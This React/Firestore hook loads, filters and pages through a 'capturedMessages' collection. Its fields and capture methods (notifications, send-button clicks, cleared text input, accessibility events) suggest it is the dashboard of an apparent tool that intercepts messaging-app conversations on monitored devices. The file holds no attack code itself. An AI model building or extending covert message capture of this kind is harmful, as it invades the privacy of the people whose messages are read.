'use client';

import { useState, useEffect, useCallback, useRef } from 'react';
import {
  db,
  collection,
  query,
  orderBy,
  onSnapshot,
  limit,
  startAfter,
  where,
  getDocs,
  QueryDocumentSnapshot,
  DocumentData,
  Timestamp,
} from '../lib/firebase-client';

export interface Message {
  id: string;
  app?: string;
  appName?: string;
  sender?: string;
  recipient?: string;
  content?: string;
  messageText?: string;
  text?: string;
  timestamp: Date;
  deviceId?: string;
  deviceName?: string;
  deviceModel?: string;
  userId?: string;
  read?: boolean;
  isSent?: boolean;
  messageType?: 'sent' | 'received';
  isGroup?: boolean;
  groupName?: string;
  packageName?: string;
  captureMethod?: 'notification' | 'send_button_click' | 'text_input_cleared' | 'accessibility_filtered' | 'accessibility' | 'notification_smart';
  [key: string]: any;
}

export interface MessageFilters {
  deviceId?: string;
  userId?: string;
  appType?: string;
  startDate?: Date;
  endDate?: Date;
  searchQuery?: string;
}

interface UseMessagesWithFiltersResult {
  messages: Message[];
  loading: boolean;
  error: string | null;
  hasMore: boolean;
  loadMore: () => Promise<void>;
  refresh: () => Promise<void>;
  totalCount: number;
  loadedCount: number;
}

export function useMessagesWithFilters(
  isAuthenticated: boolean,
  filters: MessageFilters = {},
  pageSize: number = 100
): UseMessagesWithFiltersResult {
  const [messages, setMessages] = useState<Message[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [hasMore, setHasMore] = useState(true);
  const [lastDoc, setLastDoc] = useState<QueryDocumentSnapshot<DocumentData> | null>(null);
  const [totalCount, setTotalCount] = useState(0);

  // Use ref to track if filters changed to trigger refresh
  const previousFiltersRef = useRef<string>('');

  // Build Firestore query with filters
  const buildQuery = useCallback((cursor?: QueryDocumentSnapshot<DocumentData>) => {
    const constraints: any[] = [];

    // Server-side filtering with where() clauses
    if (filters.deviceId && filters.deviceId !== 'all') {
      constraints.push(where('deviceId', '==', filters.deviceId));
    }

    if (filters.userId && filters.userId !== 'all') {
      constraints.push(where('userId', '==', filters.userId));
    }

    if (filters.appType && filters.appType !== 'all') {
      constraints.push(where('appName', '==', filters.appType));
    }

    // Date range filtering (server-side)
    if (filters.startDate) {
      constraints.push(where('timestamp', '>=', Timestamp.fromDate(filters.startDate)));
    }

    if (filters.endDate) {
      constraints.push(where('timestamp', '<=', Timestamp.fromDate(filters.endDate)));
    }

    // Always order by timestamp
    constraints.push(orderBy('timestamp', 'desc'));

    // Add pagination cursor if provided
    if (cursor) {
      constraints.push(startAfter(cursor));
    }

    // Limit results
    constraints.push(limit(pageSize));

    return query(collection(db, 'capturedMessages'), ...constraints);
  }, [filters, pageSize]);

  // Build query for total count (without limit)
  const buildCountQuery = useCallback(() => {
    const constraints: any[] = [];

    if (filters.deviceId && filters.deviceId !== 'all') {
      constraints.push(where('deviceId', '==', filters.deviceId));
    }

    if (filters.userId && filters.userId !== 'all') {
      constraints.push(where('userId', '==', filters.userId));
    }

    if (filters.appType && filters.appType !== 'all') {
      constraints.push(where('appName', '==', filters.appType));
    }

    if (filters.startDate) {
      constraints.push(where('timestamp', '>=', Timestamp.fromDate(filters.startDate)));
    }

    if (filters.endDate) {
      constraints.push(where('timestamp', '<=', Timestamp.fromDate(filters.endDate)));
    }

    // Order required for consistent counting
    constraints.push(orderBy('timestamp', 'desc'));

    return query(collection(db, 'capturedMessages'), ...constraints);
  }, [filters]);

  // Process document into Message object
  const processDocument = (doc: QueryDocumentSnapshot<DocumentData>): Message => {
    const data = doc.data();
    const timestamp = data.timestamp?.toDate() || new Date();

    return {
      id: doc.id,
      appName: data.appName || data.app,
      packageName: data.packageName,
      messageText: data.messageText,
      content: data.content,
      text: data.text,
      sender: data.sender,
      recipient: data.recipient,
      isSent: data.isSent || false,
      messageType: data.messageType || (data.isSent ? 'sent' : 'received'),
      timestamp,
      deviceId: data.deviceId,
      deviceName: data.deviceName,
      deviceModel: data.deviceModel,
      userId: data.userId,
      isGroup: data.isGroup || false,
      groupName: data.groupName,
      captureMethod: data.captureMethod,
      read: data.read,
      ...data,
    } as Message;
  };

  // Client-side search filter (for text search)
  const applyClientFilters = useCallback((messagesList: Message[]): Message[] => {
    if (!filters.searchQuery) return messagesList;

    const searchLower = filters.searchQuery.toLowerCase();
    return messagesList.filter((msg) => {
      const textContent = (msg.messageText || msg.content || msg.text || '').toLowerCase();
      const sender = (msg.sender || '').toLowerCase();
      const appName = (msg.appName || '').toLowerCase();

      return (
        textContent.includes(searchLower) ||
        sender.includes(searchLower) ||
        appName.includes(searchLower)
      );
    });
  }, [filters.searchQuery]);

  // Load initial page
  const loadInitialPage = useCallback(async () => {
    if (!isAuthenticated) {
      setLoading(false);
      return;
    }

    try {
      setLoading(true);
      setError(null);

      console.log(`📥 Loading first ${pageSize} messages with filters:`, filters);

      const q = buildQuery();
      const snapshot = await getDocs(q);
      let messagesList: Message[] = [];

      snapshot.forEach((doc) => {
        try {
          messagesList.push(processDocument(doc));
        } catch (error) {
          console.error('Error processing message document:', error);
        }
      });

      // Apply client-side filters (search)
      messagesList = applyClientFilters(messagesList);

      setMessages(messagesList);
      setLastDoc(snapshot.docs[snapshot.docs.length - 1] || null);
      setHasMore(snapshot.docs.length === pageSize);

      // Get total count with same filters
      const countQuery = buildCountQuery();
      const countSnapshot = await getDocs(countQuery);
      setTotalCount(countSnapshot.size);

      console.log(`✅ Loaded ${messagesList.length} messages (Total with filters: ${countSnapshot.size})`);
      setLoading(false);
    } catch (err: any) {
      console.error('❌ Error loading messages:', err);
      setError(err.message || 'Failed to load messages');
      setLoading(false);
    }
  }, [isAuthenticated, pageSize, buildQuery, buildCountQuery, applyClientFilters, filters]);

  // Load more (pagination)
  const loadMore = useCallback(async () => {
    if (!isAuthenticated || !hasMore || !lastDoc || loading) {
      return;
    }

    try {
      setLoading(true);
      console.log(`📥 Loading next ${pageSize} messages...`);

      const q = buildQuery(lastDoc);
      const snapshot = await getDocs(q);
      let newMessages: Message[] = [];

      snapshot.forEach((doc) => {
        try {
          newMessages.push(processDocument(doc));
        } catch (error) {
          console.error('Error processing message document:', error);
        }
      });

      // Apply client-side filters (search)
      newMessages = applyClientFilters(newMessages);

      setMessages((prev) => [...prev, ...newMessages]);
      setLastDoc(snapshot.docs[snapshot.docs.length - 1] || null);
      setHasMore(snapshot.docs.length === pageSize);

      console.log(`✅ Loaded ${newMessages.length} more messages (Total loaded: ${messages.length + newMessages.length})`);
      setLoading(false);
    } catch (err: any) {
      console.error('❌ Error loading more messages:', err);
      setError(err.message || 'Failed to load more messages');
      setLoading(false);
    }
  }, [isAuthenticated, hasMore, lastDoc, loading, pageSize, messages.length, buildQuery, applyClientFilters]);

  // Refresh
  const refresh = useCallback(async () => {
    setMessages([]);
    setLastDoc(null);
    setHasMore(true);
    await loadInitialPage();
  }, [loadInitialPage]);

  // Load initial page on mount and when filters change
  useEffect(() => {
    const filtersString = JSON.stringify(filters);

    // Check if filters actually changed
    if (filtersString !== previousFiltersRef.current) {
      previousFiltersRef.current = filtersString;

      // Reset and reload when filters change
      setMessages([]);
      setLastDoc(null);
      setHasMore(true);
      loadInitialPage();
    }
  }, [filters, loadInitialPage]);

  return {
    messages,
    loading,
    error,
    hasMore,
    loadMore,
    refresh,
    totalCount,
    loadedCount: messages.length,
  };
}
